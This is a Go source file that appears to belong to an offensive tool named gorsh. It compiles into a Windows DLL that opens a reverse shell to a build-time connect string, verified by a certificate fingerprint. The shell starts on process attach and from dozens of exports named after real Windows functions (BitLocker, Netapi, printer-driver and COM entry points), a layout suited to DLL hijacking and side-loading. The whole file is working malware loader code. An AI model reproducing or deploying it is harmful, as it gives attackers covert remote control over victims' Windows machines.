package main

//#include "dllmain.h"

// #cgo CFLAGS: -Wno-error
import "C"

import (
	"encoding/hex"
	"os"
	"strings"
	"unsafe"

	"git.hyrule.link/blink/gorsh/pkg/core"
	"git.hyrule.link/blink/gorsh/pkg/myconn"
)

var (
	connectString string
	fingerPrint   string
)

func run() {
	if connectString != "" && fingerPrint != "" {
		myconn.ConnectionString = connectString
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(core.ErrCouldNotDecode)
		}
		core.InitReverseShell(connectString, bytesFingerprint)
	}
}

//export OnProcessAttach
func OnProcessAttach(
	hinstDLL unsafe.Pointer, // handle to DLL module
	fdwReason uint32, // reason for calling function
	lpReserved unsafe.Pointer, // reserved
) {
	run()
}

//export CallNtPowerInformation
func CallNtPowerInformation() { run() }

//export ClrCreateManagedInstance
func ClrCreateManagedInstance() { run() }

//export ConstructPartialMsgVW
func ConstructPartialMsgVW() { run() }

//export CorBindToRuntimeEx
func CorBindToRuntimeEx() { run() }

//export CreateUri
func CreateUri() { run() }

//export CurrentIP
func CurrentIP() { run() }

//export DevObjCreateDeviceInfoList
func DevObjCreateDeviceInfoList() { run() }

//export DevObjDestroyDeviceInfoList
func DevObjDestroyDeviceInfoList() { run() }

//export DevObjEnumDeviceInterfaces
func DevObjEnumDeviceInterfaces() { run() }

//export DevObjGetClassDevs
func DevObjGetClassDevs() { run() }

//export DllCanUnloadNow
func DllCanUnloadNow() { run() }

//export DllGetClassObject
func DllGetClassObject() { run() }

//export DllProcessAttach
func DllProcessAttach() { run() }

//export DevObjOpenDeviceInfo
func DevObjOpenDeviceInfo() { run() }

//export DllRegisterServer
func DllRegisterServer() { run() }

//export DllUnregisterServer
func DllUnregisterServer() { run() }

//export DpxNewJob
func DpxNewJob() { run() }

//export ExtractMachineName
func ExtractMachineName() { run() }

//export FveCloseVolume
func FveCloseVolume() { run() }

//export FveCommitChanges
func FveCommitChanges() { run() }

//export FveConversionDecrypt
func FveConversionDecrypt() { run() }

//export FveDeleteAuthMethod
func FveDeleteAuthMethod() { run() }

//export FveDeleteDeviceEncryptionOptOutForVolumeW
func FveDeleteDeviceEncryptionOptOutForVolumeW() { run() }

//export FveGetAuthMethodInformation
func FveGetAuthMethodInformation() { run() }

//export FveGetStatus
func FveGetStatus() { run() }

//export FveOpenVolume
func FveOpenVolume() { run() }

//export FveRevertVolume
func FveRevertVolume() { run() }

//export GenerateActionQueue
func GenerateActionQueue() { run() }

//export GetFQDN_Ipv4
func GetFQDN_Ipv4() { run() }

//export GetMemLogObject
func GetMemLogObject() { run() }

//export GetFQDN_Ipv6
func GetFQDN_Ipv6() { run() }

//export InitCommonControlsEx
func InitCommonControlsEx() { run() }

//export IsLocalConnection
func IsLocalConnection() { run() }

//export LoadLibraryShim
func LoadLibraryShim() { run() }

//export NetApiBufferAllocate
func NetApiBufferAllocate() { run() }

//export NetApiBufferFree
func NetApiBufferFree() { run() }

//export NetApiBufferReallocate
func NetApiBufferReallocate() { run() }

//export NetApiBufferSize
func NetApiBufferSize() { run() }

//export NetRemoteComputerSupports
func NetRemoteComputerSupports() { run() }

//export NetapipBufferAllocate
func NetapipBufferAllocate() { run() }

//export NetpIsComputerNameValid
func NetpIsComputerNameValid() { run() }

//export NetpIsDomainNameValid
func NetpIsDomainNameValid() { run() }

//export NetpIsGroupNameValid
func NetpIsGroupNameValid() { run() }

//export NetpIsRemote
func NetpIsRemote() { run() }

//export NetpIsRemoteNameValid
func NetpIsRemoteNameValid() { run() }

//export NetpIsShareNameValid
func NetpIsShareNameValid() { run() }

//export NetpIsUncComputerNameValid
func NetpIsUncComputerNameValid() { run() }

//export NetpIsUserNameValid
func NetpIsUserNameValid() { run() }

//export NetpwListCanonicalize
func NetpwListCanonicalize() { run() }

//export NetpwListTraverse
func NetpwListTraverse() { run() }

//export NetpwNameCanonicalize
func NetpwNameCanonicalize() { run() }

//export NetpwNameCompare
func NetpwNameCompare() { run() }

//export NetpwNameValidate
func NetpwNameValidate() { run() }

//export NetpwPathCanonicalize
func NetpwPathCanonicalize() { run() }

//export NetpwPathCompare
func NetpwPathCompare() { run() }

//export NetpwPathType
func NetpwPathType() { run() }

//export PowerGetActiveScheme
func PowerGetActiveScheme() { run() }

//export PrivateCoInternetCombineUri
func PrivateCoInternetCombineUri() { run() }

//export ProcessActionQueue
func ProcessActionQueue() { run() }

//export RegisterDLL
func RegisterDLL() { run() }

//export Run
func Run() { run() }

//export SLGetWindowsInformation
func SLGetWindowsInformation() { run() }

//export UnRegisterDLL
func UnRegisterDLL() { run() }

//export WdsAbortBlackboa
func WdsAbortBlackboa() { run() }

// export DrvConvertDevMode
func DrvConvertDevMode() { run() }

//export DrvDeviceCapabilities
func DrvDeviceCapabilities() { run() }

//export DrvDevicePropertySheets
func DrvDevicePropertySheets() { run() }

//export DrvDocumentEvent
func DrvDocumentEvent() { run() }

//export DrvDriverEvent
func DrvDriverEvent() { run() }

//export DrvDocumentPropertySheets
func DrvDocumentPropertySheets() { run() }

//export DrvPrinterEvent
func DrvPrinterEvent() { run() }

//export DrvQueryColorProfile
func DrvQueryColorProfile() { run() }

//export DrvQueryJobAttributes
func DrvQueryJobAttributes() { run() }

//export DevQueryPrintEx
func DevQueryPrintEx() { run() }

//export DrvSplDeviceCaps
func DrvSplDeviceCaps() { run() }

//export DrvUpgradePrinter
func DrvUpgradePrinter() { run() }

func main() {}
